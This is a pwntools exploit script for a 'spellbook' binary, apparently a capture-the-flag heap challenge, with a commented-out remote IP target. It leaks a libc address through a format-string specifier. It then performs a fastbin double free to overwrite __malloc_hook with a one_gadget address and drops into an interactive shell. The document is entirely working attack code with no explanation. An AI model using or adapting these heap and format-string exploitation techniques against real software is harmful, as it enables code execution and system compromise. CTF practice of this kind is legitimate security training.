#!/usr/bin/python3
from pwn import *

context.binary = elf = ELF('./spellbook')
libc = ELF('./glibc/libc.so.6')
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

#io = remote('178.62.5.219', 32110)
io = gdb.debug(elf.path, gdbscript='''
    c
''')
#io = process(elf.path)

def add(idx, typei, power, sp):
    io.sendlineafter(b'>> ', b'1')
    io.sendlineafter(b': ', f'{idx}'.encode())
    io.sendlineafter(b': ', typei)
    io.sendlineafter(b': ', f'{power}'.encode())
    io.sendafter(b': ', sp)

def show(idx):
    io.sendlineafter(b'>> ', b'2')
    io.sendlineafter(b': ', f'{idx}'.encode())

def edit(idx, type, sp):
    io.sendlineafter(b'>> ', b'3')
    io.sendlineafter(b': ', f'{idx}'.encode())
    io.sendlineafter(b': ', f'{type}'.encode())
    io.sendafter(b': ', f'{sp}'.encode())

def delete(idx):
    io.sendlineafter(b'>> ', b'4')
    io.sendlineafter(b': ', f'{idx}'.encode())

def pwn():
    add(8, 'aaa', 0x20, b'aaa')
    add(1, b'%13$p', 0x60, b'aaa')
    show(1)
    io.recvuntil(b': 0x')
    leak = io.recvuntil(b'\n')
    libc.address = int(leak, 16) - libc.symbols['__libc_start_main'] - 240
    log.info(f'libc @ {hex(libc.address)}')

        
    add(2, b'yes', 0x60, b'aaa')


    delete(1)
    delete(2)
    delete(1)

    delete(8)


    one = 0x4527a

    log.info(f'__malloc_hook @ {hex(libc.sym["__malloc_hook"])}')

    add(1, 'wee', 0x60, p64(libc.sym['__malloc_hook'] - 0x23))
    add(2, b'yes', 0x60, b'aaa')
    add(3, b'yes', 0x60, b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')
    add(4, b'yes', 0x60, b'1111111111111111111' + p64(libc.address + one) + b'45678901234567890')

    io.sendlineafter(b'>> ', b'1')
    io.sendlineafter(b': ', f'{7}'.encode())

    io.interactive()

pwn()
